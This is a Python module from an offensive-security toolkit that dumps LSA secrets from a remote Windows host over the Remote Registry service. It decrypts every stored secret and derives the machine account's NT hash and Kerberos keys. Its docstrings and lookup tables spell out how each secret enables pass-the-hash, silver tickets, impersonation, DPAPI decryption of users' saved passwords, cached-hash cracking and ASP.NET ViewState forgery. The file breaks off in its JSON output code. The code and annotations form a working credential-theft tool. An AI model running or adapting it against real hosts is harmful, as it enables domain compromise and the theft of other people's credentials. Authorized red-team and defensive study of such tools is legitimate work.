# SPDX-License-Identifier: GPL-2.0-only
# This file is part of Scapy RED
# See https://scapy.net/ for more information
# Copyright (C) github/Ebrix

r"""
Remote LSA secret dumper.

Talks to a remote Windows host through the Remote Registry service
(MS-RRP), reuses :class:`scapyred.winreg.RegClient` for transport, and
decrypts every secret stored under ``SECURITY\Policy\Secrets``.

For each secret we extract:

  - the *current* value (``CurrVal``) and the *previous* value
    (``OldVal``) when present, both raw bytes;
  - for ``$MACHINE.ACC``, the full set of derivable machine credentials:
    NT hash (``MD4(secret_bytes)``) plus the Kerberos AES256 / AES128 /
    DES keys (RFC 3962 string-to-key, salted with the joined-domain
    realm + hostname read from the registry).

Known LSA secrets and what they unlock
--------------------------------------

The list below is non-exhaustive - any process holding the right
privilege can create a secret via ``LsaStorePrivateData``, so vendor
products often add their own. The names you should expect to see on a
*domain-joined* Windows host, with their on-disk layout and typical
offensive use:

``$MACHINE.ACC``
    The local machine's *domain* account password, as a 240/512-byte
    random UTF-16 LE byte string (Windows treats the random bytes as a
    UTF-16 password; it is not a meaningful Unicode string).

    - ``NT hash = MD4(<secret bytes>)`` - directly usable for
      pass-the-hash against the joined domain. Lets you forge silver
      tickets for any service on this host, perform S4U2Self/Proxy
      to impersonate other users locally, and (if the host is a DC)
      compromise the domain entirely.
    - The same bytes can derive the machine's Kerberos AES256 / AES128
      / DES keys via ``string-to-key`` salted with
      ``<REALM>host<computername>.<dnsdomain>`` (RFC 3962 / RFC 3961).
      We do that derivation in :func:`derive_machine_kerberos_keys` and
      report all three enctypes alongside the NT hash. The realm /
      hostname / DNS suffix are read from the running TCP/IP config
      (``HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters``);
      pass ``--realm`` / ``--hostname`` to override.

``DPAPI_SYSTEM``
    The two system-wide DPAPI master keys, packed as
    ``<version: u32 = 1><machine_key: 20 bytes><user_key: 20 bytes>``.

    - These keys decrypt every *machine* DPAPI blob and, more usefully,
      they decrypt every *user* DPAPI master key on the host without
      needing the user's logon password. With a user master key in
      hand, you can decrypt that user's saved browser passwords, RDP
      credentials (``%APPDATA%\\Microsoft\\Credentials``), Windows
      Vault entries, certificates marked exportable, etc.
    - Pair with impacket's ``dpapi.py`` to walk the master-key store
      and decrypt blobs.

``NL$KM``
    A 64-byte AES-CBC key used by Windows to encrypt the
    cached-domain-logon ("MSCacheV2") entries under
    ``HKLM\SECURITY\Cache\NL$1`` ... ``NL$<N>``.

    - Recover this key + the Cache values to extract DCC2 hashes for
      every domain user who has interactively logged on to this host.
      DCC2 is salted PBKDF2 - slow to crack, but useful when you have
      no other lever and the cached account has wide rights.

``DefaultPassword``
    If non-empty, the literal cleartext password used by
    ``Winlogon\\AutoAdminLogon`` for unattended boot.
    Immediate cleartext compromise of whichever account is configured
    in ``DefaultUserName`` / ``DefaultDomainName``.

``L$_SQSA_<SID>``
    Per-SID "saved credentials" written by tools like ``cmdkey`` or
    ``runas /savecred``. The payload is the cleartext password of the
    target account (UTF-16 LE), associated with the SID encoded in
    the suffix. Trivial cleartext-credential disclosure.

``L$_RasDefaultCredentials#0``
    The default credentials Windows uses when no per-connection
    account is provided to a Routing-and-Remote-Access (VPN/dial-up)
    connection. Cleartext password.

``_SC_<service>``
    The cleartext password (UTF-16 LE) of the account a service is
    configured to log on as. ``LocalSystem`` services have *no* secret;
    services running as domain users do, and those domain accounts are
    often privileged (SQL Server agents, scheduled-task runners,
    backup agents). One of the highest-value secrets on a typical
    Windows server.

``aspnet_WP_PASSWORD``
    Cleartext password (UTF-16 LE) of the account IIS uses to spawn
    worker processes. Useful if the IIS host is configured to run app
    pools as a specific domain account.

``L$ASP.NETAutoGenKeys*``
    The ASP.NET ``machineKey`` validation/decryption material. Lets
    you forge ``__VIEWSTATE`` / FormsAuth tickets for every ASP.NET
    application served by this host - frequent path to RCE on
    enterprise web apps.

``L$_HydraEncKey_<guid>``
    Per-listener encryption material used by Terminal Services /
    Remote Desktop Session Host. Less commonly weaponised but worth
    capturing for completeness.

References
----------
The on-disk LSA layout is not documented by Microsoft; the structures
decoded here are reconstructed from public sources cited inline next
to each function:

- ``impacket/examples/secretsdump.py`` (Fortra / SecureAuth) - the
  reference open-source implementation; covers both the legacy
  RC4-MD5 path (``PolSecretEncryptionKey``) and the modern AES-CBC
  path used since Vista (``PolEKList``).
  https://github.com/fortra/impacket
- Microsoft Open Specifications, ``[MS-LSAD]`` §3.1.4.6 - documents
  the secret semantics (current vs. old value, name conventions)
  even though the on-the-wire LsarSetSecret format does not match
  the on-disk LSA_SECRET layout.
- Microsoft Open Specifications, ``[MS-DTYP]`` §2.3.3 (FILETIME).

Only the modern Vista+ path (AES-CBC, ``PolEKList``) is implemented.
On legacy Windows (XP / Server 2003) the ``PolEKList`` value is
absent; we emit a warning and produce no output.
"""

import hashlib
import logging
import sys

from dataclasses import asdict, dataclass

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from scapy.config import conf
from scapy.error import log_runtime
from scapy.themes import DefaultTheme, NoTheme

from scapyred.winreg import RegClient
from scapyred._winhive import (
    _banner,
    _read_default_value,
    _read_value,
    _u32,
    get_boot_key,
)


# --------------------------------------------------------------------------- #
# LSA blob crypto (Vista+, AES-CBC with reset-IV-per-block)
# --------------------------------------------------------------------------- #
#
# Vista-and-later LSA secrets are wrapped in a two-layer envelope:
#
#   struct LSA_SECRET {
#       DWORD Version;          // 1
#       BYTE  EncKeyId[16];     // GUID identifying the wrapping key
#       DWORD EncAlgorithm;     // typically 0x6610 (AES-256-CBC)
#       DWORD Flags;
#       BYTE  EncryptedData[];  // first 32 bytes = salt (mixed into the
#                               //                  per-blob AES key);
#                               // remainder        = ciphertext.
#   };
#
# After AES-decryption (see :func:`_decrypt_lsa_blob`) the plaintext is
# itself an LSA_SECRET_BLOB::
#
#   struct LSA_SECRET_BLOB {
#       DWORD Length;
#       BYTE  Unknown[12];
#       BYTE  Secret[Length];
#   };
#
# The same two-layer envelope is reused for the *master* LSA key
# (stored as the default value of ``SECURITY\Policy\PolEKList``, keyed
# off the BootKey) and for individual secrets under
# ``SECURITY\Policy\Secrets\<name>\{CurrVal,OldVal}`` (keyed off the
# LSA Key extracted from PolEKList).

_LSA_SECRET_HEADER = 28  # Version(4) + EncKeyId(16) + EncAlg(4) + Flags(4)
_LSA_BLOB_HEADER = 16  # Length(4) + Unknown(12)


def _sha256_iter(key: bytes, data: bytes, rounds: int = 1000) -> bytes:
    """SHA-256 of ``key + data*rounds``, the schedule used to derive
    every per-blob AES key in the modern LSA layout."""
    h = hashlib.sha256()
    h.update(key)
    for _ in range(rounds):
        h.update(data)
    return h.digest()


def _aes_ecb(key: bytes, data: bytes) -> bytes:
    """AES decrypt with implicit zero-pad to 16 bytes.

    Equivalent to impacket's ``decryptAES`` when called with
    ``IV=b'\\x00' * 16`` - that path resets the IV for every block,
    which collapses CBC into ECB.
    """
    if len(data) % 16:
        data = data + b"\x00" * (16 - len(data) % 16)
    cipher = Cipher(algorithms.AES(key), modes.ECB())
    dec = cipher.decryptor()
    return dec.update(data) + dec.finalize()


def _decrypt_lsa_blob(blob: bytes, key: bytes) -> bytes:
    """Decrypt a Vista+ LSA_SECRET blob and return the inner Secret
    bytes (LSA_SECRET_BLOB header stripped).

    Returns ``b""`` on malformed / too-short input rather than raising
    so callers can keep walking the rest of the secrets.
    """
    if len(blob) < _LSA_SECRET_HEADER + 32:
        return b""
    enc = blob[_LSA_SECRET_HEADER:]
    tmp = _sha256_iter(key, enc[:32])
    plain = _aes_ecb(tmp, enc[32:])
    if len(plain) < _LSA_BLOB_HEADER:
        return b""
    length = _u32(plain, 0)
    end = min(_LSA_BLOB_HEADER + length, len(plain))
    return plain[_LSA_BLOB_HEADER:end]


def _md4(data: bytes) -> bytes:
    """MD4 wrapper.

    ``hashlib.new("md4", ...)`` only works when OpenSSL's *legacy
    provider* is loaded. Modern Linux distros (Ubuntu 22.04+, Debian
    12+, recent Fedora) ship Python with that provider disabled at the
    system level, so we fall back to scapy's pure-Python MD4 - which is
    a hard dependency of this package anyway.
    """
    try:
        return hashlib.new("md4", data, usedforsecurity=False).digest()
    except (ValueError, TypeError):
        from scapy.libs.rfc3961 import Hash_MD4

        return Hash_MD4().digest(data)


# --------------------------------------------------------------------------- #
# Machine account Kerberos key derivation
# --------------------------------------------------------------------------- #
#
# The SECURITY hive does not store the Kerberos keys directly. Only the
# raw password is in ``$MACHINE.ACC``; the AES256 / AES128 / DES keys
# are derived on the fly via RFC 3962 string-to-key whenever Kerberos
# auth happens. That derivation needs:
#
#   - the realm (the AD/Kerberos realm of the joined domain, in upper
#     case - usually identical to the DNS domain in upper case);
#   - the salt, which for a machine principal is canonically
#     ``<REALM>host<host_lower>.<dnsdomain_lower>``
#     (see [MS-KILE] §3.1.1.2 "Cryptographic Material").
#
# Both pieces of information sit in the registry under
# ``HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`` (Domain +
# Hostname); we read them while we still have the connection open.
# CLI overrides exist for the case where the registry values are absent
# (workgroup-joined hosts) or outdated.

# Map our enctype names to the rfc3961 enum + LsaSecret field name.
_KRB_ENCTYPES: list[tuple[str, str]] = [
    ("AES256_CTS_HMAC_SHA1_96", "kerberos_aes256"),
    ("AES128_CTS_HMAC_SHA1_96", "kerberos_aes128"),
    ("DES_CBC_MD5", "kerberos_des"),
]


def _decode_reg_string(data) -> str:
    """Best-effort decode of a registry value that should be a string.

    REG_SZ values come back as UTF-16 LE bytes (with trailing nulls)
    over MS-RRP; some scapy paths pre-decode to ``str``. Handle both
    and strip the trailing NULs."""
    if data is None:
        return ""
    if isinstance(data, str):
        return data.rstrip("\x00")
    if isinstance(data, bytes):
        for codec in ("utf-16-le", "utf-8", "latin-1"):
            try:
                return data.decode(codec).rstrip("\x00")
            except UnicodeDecodeError:
                continue
    return ""


def _read_tcpip_parameters(
    client: RegClient,
) -> tuple[str, str]:
    r"""Return ``(dns_domain, hostname)`` read from the running TCP/IP
    config under ``HKLM\SYSTEM\CurrentControlSet\Services\Tcpip``.
    Either field may come back empty (workgroup-joined hosts have no
    DNS domain; barebones images sometimes lack a Hostname value)."""
    base = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"
    dns_domain = ""
    hostname = ""
    for key in ("Domain", "Hostname"):
        try:
            raw = _read_value(client, base, key)
        except RuntimeError:
            continue
        decoded = _decode_reg_string(raw)
        if key == "Domain":
            dns_domain = decoded
        else:
            hostname = decoded
    return dns_domain, hostname


def derive_machine_kerberos_keys(
    password: bytes,
    realm: str,
    hostname: str,
    dns_domain: str,
) -> dict[str, bytes]:
    r"""
    Derive the machine account's Kerberos keys from its raw password.

    :param password: the raw bytes of the ``$MACHINE.ACC`` secret -
        i.e. the random UTF-16 LE byte string Windows uses as the
        machine password. Pass this in as-is, do *not* try to decode
        it.
    :param realm: the Kerberos realm, in upper case (e.g.
        ``"LAB.LOCAL"``). Almost always equals ``dns_domain.upper()``.
    :param hostname: the NetBIOS / short DNS hostname of the machine,
        case-insensitive (e.g. ``"WKS123"`` / ``"wks123"``).
    :param dns_domain: the DNS suffix of the machine, case-insensitive
        (e.g. ``"lab.local"``).

    :return: ``{"AES256_CTS_HMAC_SHA1_96": <32 bytes>,
                "AES128_CTS_HMAC_SHA1_96": <16 bytes>,
                "DES_CBC_MD5": <8 bytes>}``.
        Each enctype that fails to derive maps to ``b""`` instead.

    The salt format is the documented machine-principal salt
    (``<REALM>host<host>.<dnsdomain>`` with the case rules above), and
    the iteration count is the Kerberos default of 4096. We use scapy's
    ``rfc3961`` implementation, the same one scapy uses everywhere
    else for Kerberos.
    """
    if not (password and realm and hostname and dns_domain):
        return {name: b"" for name, _ in _KRB_ENCTYPES}

    from scapy.libs.rfc3961 import EncryptionType, Key

    salt = (f"{realm.upper()}host{hostname.lower()}.{dns_domain.lower()}").encode(
        "utf-8"
    )

    # The machine password is 240/512 random bytes that Windows treats
    # as a UTF-16 LE password, but those bytes routinely contain
    # *invalid* UTF-16 surrogates. When Windows converts the password
    # to UTF-8 before feeding it into RFC 3962 string-to-key it does so
    # with the standard "replace invalid sequences with U+FFFD" policy
    # - which means the byte string fed to PBKDF2 is *not* the raw
    # secret but the UTF-8 of "what utf-16-le->str produced after
    # surrogate replacement". Skipping this round-trip yields keys that
    # look right but don't match what the KDC accepts. Credit:
    # Dirk-jan Mollema, impacket secretsdump
    # (``LSASecrets.__printMachineKerberos``).
    cleaned = password.decode("utf-16-le", "replace").encode("utf-8", "replace")

    out: dict[str, bytes] = {}
    for etype_name, _ in _KRB_ENCTYPES:
        try:
            etype = EncryptionType[etype_name]
            out[etype_name] = Key.string_to_key(etype, cleaned, salt).key
        except Exception as exc:
            log_runtime.warning("Could not derive %s key: %s", etype_name, exc)
            out[etype_name] = b""
    return out


# --------------------------------------------------------------------------- #
# LSA Key extraction (SECURITY\Policy\PolEKList)
# --------------------------------------------------------------------------- #
#
# The 32-byte LSA Key is the AES key Windows uses to wrap individual
# secrets. It is itself wrapped (Vista+) inside an LSA_SECRET stored
# as the default value of ``SECURITY\Policy\PolEKList``, with the
# BootKey as the wrapping key.
#
# After unwrapping with :func:`_decrypt_lsa_blob`, the plaintext
# starts with a small key-management header; the actual 32-byte LSA
# Key sits at offset 52 of that buffer. The legacy (XP/2003) layout
# uses a different value name (``PolSecretEncryptionKey``) and an
# RC4-MD5 schedule - not implemented here.


def get_lsa_key(client: RegClient, boot_key: bytes) -> bytes:
    r"""
    Read ``SECURITY\Policy\PolEKList`` and return the 32-byte LSA Key
    used to wrap individual secrets. Returns ``b""`` if the value is
    absent (e.g. legacy XP/2003 host) or if its payload looks malformed.
    """
    try:
        blob = _read_default_value(client, "SECURITY\\Policy\\PolEKList")
    except RuntimeError:
        log_runtime.warning(
            "PolEKList not found - legacy LSA layout (XP/2003) is not "
            "supported, skipping LSA secrets"
        )
        return b""
    secret = _decrypt_lsa_blob(blob, boot_key)
    if len(secret) < 84:
        log_runtime.warning(
            "Decrypted PolEKList payload too short (%d bytes)",
            len(secret),
        )
        return b""
    return secret[52:84]


# --------------------------------------------------------------------------- #
# Public dataclass + secret enumeration
# --------------------------------------------------------------------------- #


@dataclass
class LsaSecret:
    r"""A single LSA secret read from ``SECURITY\Policy\Secrets``.

    Each secret in the registry lives under its own subkey (``name``)
    and carries up to two values: ``CurrVal`` (the secret currently in
    use) and ``OldVal`` (the previous one, retained by Windows so a
    consumer that hasn't seen the rotation yet can still authenticate).
    Both values are stored encrypted; this dataclass holds the
    *decrypted* plaintext for each.

    The semantic interpretation of those plaintext bytes depends on the
    secret name - see this module's docstring for the catalogue of
    well-known names. Two examples:

    - ``$MACHINE.ACC``: the bytes are a 240/512-byte UTF-16 LE
      "password" (random, not a meaningful string). The NT hash usable
      for pass-the-hash is :pyattr:`nt_hash` = ``MD4(current)``.
    - ``DPAPI_SYSTEM``: the bytes are a packed 4+20+20-byte structure
      (``<version: u32><machine_key><user_key>``). Use
      :func:`_format_dpapi_system` to split them.
    """

    #: Registry name of the secret. Examples: ``"$MACHINE.ACC"``,
    #: ``"DPAPI_SYSTEM"``, ``"NL$KM"``, ``"_SC_MSSQL$SQLEXPRESS"``,
    #: ``"L$_SQSA_S-1-5-21-..."``. Anything is possible - any process
    #: with the right privilege can call ``LsaStorePrivateData``.
    name: str

    #: Decrypted current value. Layout depends on ``name``; see the
    #: module docstring. Empty when the secret has no ``CurrVal``
    #: subkey or its blob is malformed.
    current: bytes = b""

    #: Decrypted previous value (``OldVal``). Empty when the registry
    #: only holds the current secret. Comparing ``current`` and ``old``
    #: is occasionally useful: a non-empty ``old`` proves that a
    #: rotation has happened and the previous secret may still be
    #: accepted by stragglers.
    old: bytes = b""

    #: Only populated for ``name == "$MACHINE.ACC"``: ``MD4(current)``,
    #: i.e. the NT hash of the machine account password. Drop this
    #: hash straight into a pass-the-hash workflow against the joined
    #: domain (silver tickets, S4U2Self, NTLMSSP relay, etc.). Empty
    #: for every other secret name.
    nt_hash: bytes = b""

    #: 32-byte AES256-CTS-HMAC-SHA1-96 Kerberos key derived from the
    #: machine password (``$MACHINE.ACC`` only). Empty for every other
    #: secret, and empty for ``$MACHINE.ACC`` if we couldn't determine
    #: the realm/hostname needed for the salt. Use this with
    #: ``--HashAes256Sha96`` on the other scapy-red tools to do
    #: Kerberos auth as the machine account.
    kerberos_aes256: bytes = b""

    #: 16-byte AES128-CTS-HMAC-SHA1-96 Kerberos key. Same conditions
    #: as ``kerberos_aes256``; pair with ``--HashAes128Sha96``.
    kerberos_aes128: bytes = b""

    #: 8-byte DES-CBC-MD5 Kerberos key (legacy enctype 3). Often
    #: refused by modern KDCs but still useful when Kerberos is
    #: explicitly downgraded.
    kerberos_des: bytes = b""


def dump_lsa_secrets(
    client: RegClient,
    lsa_key: bytes,
    realm: str = "",
    hostname: str = "",
    dns_domain: str = "",
) -> list[LsaSecret]:
    r"""
    Walk ``SECURITY\Policy\Secrets`` and decrypt every secret with the
    given 32-byte LSA Key. Each secret has up to two values:

    - ``CurrVal``: the current secret;
    - ``OldVal``: the previous one (kept by Windows so that a
      service / machine that hasn't seen the password rotation yet can
      still authenticate).

    For ``$MACHINE.ACC`` we also compute:

    - the NT hash of the machine account password (``MD4(current)``);
    - the Kerberos AES256 / AES128 / DES keys derived via
      :func:`derive_machine_kerberos_keys` - but only when ``realm``,
      ``hostname`` and ``dns_domain`` are all supplied. Pass them as
      empty strings to skip Kerberos derivation.
    """
    if not lsa_key:
        return []
    base = "SECURITY\\Policy\\Secrets"
    out: list[LsaSecret] = []
    try:
        names = client.ls(base)
    except Exception as exc:
        log_runtime.debug("No secrets under %s: %s", base, exc)
        return []
    for name in names:
        curr = b""
        old = b""
        try:
            blob = _read_default_value(client, f"{base}\\{name}\\CurrVal")
            curr = _decrypt_lsa_blob(blob, lsa_key)
        except RuntimeError:
            pass
        except Exception as exc:
            log_runtime.warning("CurrVal of %s: %s", name, exc)
        try:
            blob = _read_default_value(client, f"{base}\\{name}\\OldVal")
            old = _decrypt_lsa_blob(blob, lsa_key)
        except RuntimeError:
            pass
        except Exception as exc:
            log_runtime.warning("OldVal of %s: %s", name, exc)

        nt = b""
        krb: dict[str, bytes] = {}
        if name == "$MACHINE.ACC" and curr:
            nt = _md4(curr)
            krb = derive_machine_kerberos_keys(
                curr,
                realm,
                hostname,
                dns_domain,
            )

        out.append(
            LsaSecret(
                name=name,
                current=curr,
                old=old,
                nt_hash=nt,
                kerberos_aes256=krb.get("AES256_CTS_HMAC_SHA1_96", b""),
                kerberos_aes128=krb.get("AES128_CTS_HMAC_SHA1_96", b""),
                kerberos_des=krb.get("DES_CBC_MD5", b""),
            )
        )
    return out


# --------------------------------------------------------------------------- #
# Pretty-printers
# --------------------------------------------------------------------------- #

# Empty LM hash placeholder, used in pwdump output for the machine
# account row to keep the canonical format.
_EMPTY_LM = bytes.fromhex("aad3b435b51404eeaad3b435b51404ee")


# Known-secret catalogue used by the pretty-printer to attach a
# one-line "what is this / what can I do with it" annotation to every
# secret in the dump. This is a deliberate red-team aid: the raw bytes
# are useless unless you know that ``L$_SQSA_<sid>`` is cleartext, that
# ``DPAPI_SYSTEM`` lets you decrypt every user's master keys offline,
# etc. See the module docstring for the full reference.
#
# Keyed by exact secret name. For pattern-based names (``_SC_<svc>``,
# ``L$_SQSA_<SID>``, ...) see :data:`_SECRET_PATTERNS` below.
_KNOWN_SECRETS: dict[str, tuple[str, str]] = {
    "$MACHINE.ACC": (
        "Machine account password",
        "MD4(secret) is the NT hash usable for pass-the-hash against "
        "the joined domain (silver tickets, S4U2Self, NTLM relay).",
    ),
    "DPAPI_SYSTEM": (
        "System DPAPI master keys",
        "Decrypts every user's DPAPI master keys offline - browser "
        "passwords, RDP creds, Windows Vault items - without their "
        "logon password.",
    ),
    "NL$KM": (
        "MSCacheV2 cache encryption key",
        "Decrypts cached domain logons under HKLM\\SECURITY\\Cache "
        "(NL$1, NL$2, ...) for offline DCC2 cracking.",
    ),
    "DefaultPassword": (
        "AutoAdminLogon plaintext password",
        "If non-empty, immediate cleartext compromise of the "
        "Winlogon\\DefaultUserName account.",
    ),
    "aspnet_WP_PASSWORD": (
        "IIS worker process credentials",
        "Cleartext password (UTF-16 LE) of the account IIS uses to "
        "spawn worker processes.",
    ),
}


# Pattern-prefix table for secrets whose names embed a variable suffix
# (a SID, a service name, a GUID). Order matters: first match wins.
_SECRET_PATTERNS: list[tuple[str, str, str]] = [
    (
        "_SC_",
        "Service account credentials",
        "Cleartext password (UTF-16 LE) of the account this service "
        "is configured to log on as. LocalSystem services have no "
        "secret; domain-account services do, and those accounts are "
        "frequently privileged.",
    ),
    (
        "L$_SQSA_",
        "Saved per-SID auto-logon credentials",
        "Cleartext password (UTF-16 LE) saved with cmdkey or "
        "runas /savecred for the user SID encoded in the suffix.",
    ),
    (
        "L$_RasDefaultCredentials",
        "Saved VPN / RAS credentials",
        "Default cleartext credentials for the Routing-and-Remote-"
        "Access (VPN/dial-up) connection when no per-connection "
        "account is set.",
    ),
    (
        "L$ASP.NETAutoGenKeys",
        "ASP.NET machineKey material",
        "Validation/decryption keys for __VIEWSTATE and FormsAuth - "
        "common path to RCE on ASP.NET applications.",
    ),
    (
        "L$_HydraEncKey",
        "Terminal Services encryption key",
        "Per-listener encryption material used by RDP / RDS.",
    ),
]


def _describe_secret(name: str) -> tuple[str, str] | None:
    """Look ``name`` up in the known-secret tables.

    Returns ``(short_label, usage_note)`` for recognised names, or
    ``None`` for anything we don't have a hand-written annotation for
    (the secret will still be dumped - we just won't tell the operator
    what to do with it)."""
    if name in _KNOWN_SECRETS:
        return _KNOWN_SECRETS[name]
    for prefix, label, note in _SECRET_PATTERNS:
        if name.startswith(prefix):
            return (label, note)
    return None


def _hexpreview(data: bytes, cap: int = 96) -> str:
    """Hex-encode ``data``; truncate with an ellipsis past ``cap`` chars."""
    h = data.hex()
    return h if len(h) <= cap else h[:cap] + "..."


def _maybe_utf16(data: bytes) -> str:
    """Return ``data`` decoded as UTF-16 LE iff the result is non-empty
    and looks ASCII-printable; otherwise return ``""``. Used to
    opportunistically reveal cleartext service-account passwords."""
    if len(data) < 2 or len(data) % 2:
        return ""
    try:
        decoded = data.decode("utf-16-le").rstrip("\x00")
    except UnicodeDecodeError:
        return ""
    if not decoded:
        return ""
    if not all(c == "\t" or 0x20 <= ord(c) < 0x7F for c in decoded):
        return ""
    return decoded


def _format_dpapi_system(data: bytes) -> str | None:
    """Decode a ``DPAPI_SYSTEM`` secret payload (4-byte version +
    20-byte machine key + 20-byte user key). Returns a single-line
    summary or ``None`` on malformed input."""
    if len(data) < 44:
        return None
    machine = data[4:24].hex()
    user = data[24:44].hex()
    return f"machine={machine}  user={user}"


def _print_lsa_secrets(secrets: list[LsaSecret]) -> None:
    """Render the LSA-secrets section, highlighting ``$MACHINE.ACC``."""
    if not secrets:
        return
    ct = conf.color_theme
    _banner("LSA secrets (SECURITY\\Policy\\Secrets)")

    for s in sorted(secrets, key=lambda x: x.name):
        is_machine = s.name == "$MACHINE.ACC"
        title = f"  {s.name}"
        print(ct.red(ct.bold(title)) if is_machine else ct.bold(title))

        # Annotate known secrets with a one-line "what is it / what
        # can I do with it" line so an operator can triage quickly.
        described = _describe_secret(s.name)
        if described is not None:
            label, note = described
            print(f"    {ct.cyan(label)}: {note}")

        if is_machine:
            if s.nt_hash:
                print(f"    Machine NT hash         : " f"{ct.bold(s.nt_hash.hex())}")
            else:
                print(
                    f"    Machine NT hash         : " f"{ct.gray('(MD4 unavailable)')}"
                )
            if s.kerberos_aes256:
                print(
                    f"    Kerberos AES256-SHA1-96 : "
                    f"{ct.bold(s.kerberos_aes256.hex())}"
                )
            if s.kerberos_aes128:
                print(
                    f"    Kerberos AES128-SHA1-96 : "
                    f"{ct.bold(s.kerberos_aes128.hex())}"
                )
            if s.kerberos_des:
                print(
                    f"    Kerberos DES-CBC-MD5    : " f"{ct.bold(s.kerberos_des.hex())}"
                )

        if s.current:
            print(
                f"    CurrVal ({len(s.current)} bytes) : " f"{_hexpreview(s.current)}"
            )
            if s.name == "DPAPI_SYSTEM":
                summary = _format_dpapi_system(s.current)
                if summary is not None:
                    print(f"      decoded   : {summary}")
            text = _maybe_utf16(s.current)
            if text:
                print(f"      utf-16-le : {text!r}")
        else:
            print("    CurrVal : (empty)")

        if s.old:
            print(f"    OldVal  ({len(s.old)} bytes) : " f"{_hexpreview(s.old)}")
            text = _maybe_utf16(s.old)
            if text:
                print(f"      utf-16-le : {text!r}")
        print()


# --------------------------------------------------------------------------- #
# JSON serialization
# --------------------------------------------------------------------------- #


def _jsonify(obj):
    """Recursively convert ``bytes`` to hex strings so a
    :func:`dataclasses.asdict` tree round-trips through ``json.dumps``."""
    if isinstance(obj, bytes):
        return obj.hex()
    if isinstance(obj, dict):
        return {k: _jsonify(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_jsonify(v) for v in obj]
    return obj


# --------------------------------------------------------------------------- #
# Entry point
# --------------------------------------------------------------------------- #


def securityhive(
    target: str,
    UPN: str = None,
    password: str = None,
    HashNt: bytes = None,
    HashAes256Sha96: bytes = None,
    HashAes128Sha96: bytes = None,
    kerberos_required: bool = False,
    use_krb5ccname: bool = False,
    use_winssp: bool = False,
    debug: int = 0,
    pwdump: bool = False,
    json_out: bool = False,
    color: bool = True,
    timeout: int = 5,
    realm: str = None,
    hostname: str = None,
):
    r"""
    Dump LSA secrets (machine account hash and Kerberos keys,
    DPAPI_SYSTEM, NL$KM, cached service-account passwords, ...) from a
    remote Windows host through the Remote Registry service.

    Only the modern Vista+ AES-CBC layout is supported. On legacy
    targets (Windows XP / Server 2003) ``PolEKList`` is absent and the
    tool emits a warning and produces no output.

    :param target: hostname, IPv4 or IPv6 of the remote machine
    :param UPN: the upn to use (DOMAIN/USER, DOMAIN\USER, USER@DOMAIN or USER)
    :param password: if provided, used for auth
    :param HashNt: if provided, used for auth (NTLM)
    :param HashAes256Sha96: if provided, used for auth (Kerberos)
    :param HashAes128Sha96: if provided, used for auth (Kerberos)
    :param kerberos_required: require kerberos
    :param use_krb5ccname: if true, use KRB5CCNAME environment variable
    :param use_winssp: (Windows only) use implicit auth via WinSSP
    :param debug: scapy debug verbosity
    :param pwdump: emit only the machine account ``$MACHINE.ACC`` lines
        in pwdump format (NT hash + Kerberos AES256 / AES128 / DES),
        suitable for piping into Kerberos-aware password-cracking and
        impersonation tooling
    :param json_out: emit the entire dump as JSON instead of the
        human-readable view (useful for piping into jq, etc.)
    :param color: emit ANSI colors in the human-readable view; pass
        ``--no-color`` on the CLI to turn this off
    :param timeout: SMB / RRP timeout
    :param realm: Kerberos realm (e.g. ``LAB.LOCAL``) used to salt the
        machine account string-to-key. When unset we read the DNS
        domain from the registry and upper-case it. Pass this if the
        registry value is empty (workgroup hosts) or wrong.
    :param hostname: short hostname (e.g. ``WKS123``) used to build the
        machine principal salt. When unset we read it from the
        registry. Override only if the registry value is wrong.
    """
    if debug:
        log_runtime.setLevel(logging.DEBUG)

    if pwdump or json_out or not color or not sys.stdout.isatty():
        conf.color_theme = NoTheme()
    else:
        conf.color_theme = DefaultTheme()

    client = RegClient(
        target,
        UPN=UPN,
        password=password,
        HashNt=HashNt,
        HashAes256Sha96=HashAes256Sha96,
        HashAes128Sha96=HashAes128Sha96,
        kerberos_required=kerberos_required,
        use_krb5ccname=use_krb5ccname,
        use_winssp=use_winssp,
        timeout=timeout,
        debug=debug,
        cli=False,
    )
    try:
        client.use("HKLM")
        # Backup privilege is required to read the SECURITY hive and
        # the LSA placeholder Class strings used to derive the BootKey.
        client.backup(activate=True)

        boot_key = get_boot_key(client)
        log_runtime.debug("BootKey = %s", boot_key.hex())

        lsa_key = get_lsa_key(client, boot_key)
        if lsa_key:
            log_runtime.debug("LSA Key = %s", lsa_key.hex())

        # Read the running TCP/IP config to learn the DNS domain and
        # short hostname; the user can override either via CLI flags.
        # Realm defaults to upper(dns_domain) when not specified - that
        # is the convention for AD-joined hosts.
        reg_domain, reg_hostname = _read_tcpip_parameters(client)
        eff_dns_domain = reg_domain
        eff_hostname = hostname if hostname is not None else reg_hostname
        eff_realm = realm if realm is not None else reg_domain.upper()
        if eff_realm and eff_hostname and eff_dns_domain:
            log_runtime.debug(
                "Kerberos salt = %shost%s.%s",
                eff_realm.upper(),
                eff_hostname.lower(),
                eff_dns_domain.lower(),
            )
        else:
            log_runtime.debug(
                "Insufficient realm/hostname/domain (realm=%r host=%r "
                "dns=%r) - skipping Kerberos key derivation",
                eff_realm,
                eff_hostname,
                eff_dns_domain,
            )

        secrets = dump_lsa_secrets(
            client,
            lsa_key,
            realm=eff_realm,
            hostname=eff_hostname,
            dns_domain=eff_dns_domain,
        )
    finally:
        try:
            client.close()
        except Exception:
            pass

    if pwdump:
        # Emit one secretsdump-compatible block per $MACHINE.ACC slot:
        # the canonical pwdump line for the NT hash plus, when we
        # managed to derive them, one ``<NAME>:<enctype>:<key>`` line
        # per Kerberos enctype. This matches what
        # ``impacket-secretsdump`` writes.
        for s in secrets:
            if s.name != "$MACHINE.ACC" or not s.nt_hash:
                continue
            label = f"{eff_hostname.upper()}$" if eff_hostname else "$MACHINE.ACC"
            if s.kerberos_aes256:
                print(f"{label}:aes256-cts-hmac-sha1-96:" f"{s.kerberos_aes256.hex()}")
            if s.kerberos_aes128:
                print(f"{label}:aes128-cts-hmac-sha1-96:" f"{s.kerberos_aes128.hex()}")
            if s.kerberos_des:
                print(f"{label}:des-cbc-md5:{s.kerberos_des.hex()}")
            print(f"{label}:{_EMPTY_LM.hex()}:{s.nt_hash.hex()}:::")
        return

    if json_out:
        import json as _json

        print(
            _json.dumps(
                _jsonify(
                    {
                        "boot_key": boot_key,
                        "lsa_key": lsa_key,
